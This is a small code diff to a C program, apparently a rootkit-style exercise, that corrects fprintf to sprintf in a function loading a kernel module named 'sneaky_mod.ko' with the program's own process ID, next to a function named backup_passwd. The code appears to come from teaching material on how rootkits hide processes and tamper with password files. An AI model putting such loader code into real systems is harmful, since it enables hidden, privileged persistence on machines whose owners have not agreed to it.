@@ -17,7 +17,7 @@ void backup_passwd() {
 // Step 3: load module
 void load_module() {
   char cmd[100];
-  fprintf(cmd, "insmod sneaky_mod.ko pid=%d", (int)getpid());
+  sprintf(cmd, "insmod sneaky_mod.ko pid=%d", (int)getpid());
   system(cmd);
 }
 
